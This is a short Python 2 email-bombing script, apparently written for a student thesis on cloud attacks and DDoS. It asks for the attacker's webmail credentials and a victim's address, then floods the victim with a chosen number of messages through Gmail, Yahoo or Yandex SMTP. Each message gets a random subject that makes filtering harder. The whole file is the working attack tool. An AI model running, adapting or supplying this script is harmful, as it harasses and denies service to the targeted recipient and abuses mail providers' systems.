import os
import smtplib
#import icmplib
import getpass
import sys

class bcolors:
	GREEN = '\033[92m'
	WARNING = '\033[93m'
	RED = '\033[91m'
	FAIL = '\033[91m'
	ENDC = '\033[0m'

print bcolors.RED + '''


	 ____	 ____   _______ _______                      _   _     
	/ ___|  / ___|  |_   _| | ____|                     / | / |    
 	| |     \___ \    | |   |  _|    _____ _____ _____  | | | |    
 	| |___   ___) |   | |   | |___  |_____|_____|_____| | | | |  _ 
  	\____|  |____/    |_|   |_____|                     |_| |_| ( )
                                                                    |/ 
	 __  __    _      ___   _         ____     ___       _      __  __   ____    
	|  \/  |  / \    |_ _| | |       | __ )   / _ \     / \    |  \/  | | __ )   
	| |\/| | / _ \    | |  | |       |  _ \  | | | |   / _ \   | |\/| | |  _ \   
	| |  | |/ ___ \   | |  | |___    | |_) | | |_| |  / ___ \  | |  | | | |_) |  
	|_|  |_/_/   \_\ |___| |_____|   |____/   \___/  /_/   \_\ |_|  |_| |____/
			
			Created By, 
				-> Rimon Mahamud Rony
				-> Department of Comupter Science & Telecommunication Engineering
				-> ID: ASH1601012M , ' Thu 13 Feb 2020 01:49:42 PM EST ' 
					
	For the thesis entitled "Analysis of attacks on Cloud Computing and simulation of DDos "

''' +bcolors.ENDC


server = raw_input ('\t\t \n\n Write your gamail domain\n for ->gamil ="gamil" \n for-> yahoo = "yahoo" \n for-> yandex="yandex" \n \t => So your domain: ')
attacking_email = raw_input('\n\n\t => Enter the attacking email :  ')
passwd = getpass.getpass('\n\n\t => attacking email password:  ')


victims_email = raw_input('\n\n\t =>victims email : ')
#subject = raw_input('Subject: ') 
body = raw_input(' \n\t Say somethnig from rimons email boambing: ')
number_of_email = input('\n\n\t => Number of emails : ')

if server == 'gmail':
    smtp_server = 'smtp.gmail.com'
    port = 587
elif server == 'yahoo':
    smtp_server = 'smtp.mail.yahoo.com'
    port = 25

elif server == 'yandex':
    smtp_server = 'smtp.yandex.ru'
    port = 25

else:
    print bcolors.RED +'Applies only to gmail and yahoo and yandex is not working for a bad gate way'+bcolors.ENDC
    sys.exit()

print ''

try:
    server = smtplib.SMTP(smtp_server,port) 
    server.ehlo()
    if smtp_server == "smtp.gmail.com":
            server.starttls()
    server.login(attacking_email,passwd)
    for i in range(1, number_of_email+1):
        subject = os.urandom(20)
        msg = 'From: ' + attacking_email + '\nSubject: ' + subject + '\n' + body
        server.sendmail(attacking_email,victims_email,msg)
	print bcolors.RED +"\remail reached : %i" % i+bcolors.ENDC
        sys.stdout.flush()
    server.quit()
    print bcolors.GREEN +'\n rimons attack is completed !!!'+bcolors.ENDC
except KeyboardInterrupt:
    print '[-] Canceled'
    sys.exit()
except smtplib.SMTPAuthenticationError:
    print bcolors.RED +'\n[!] oooooopssss!!!! -> SMTPAuthenticationError'+bcolors.ENDC
    sys.exit()
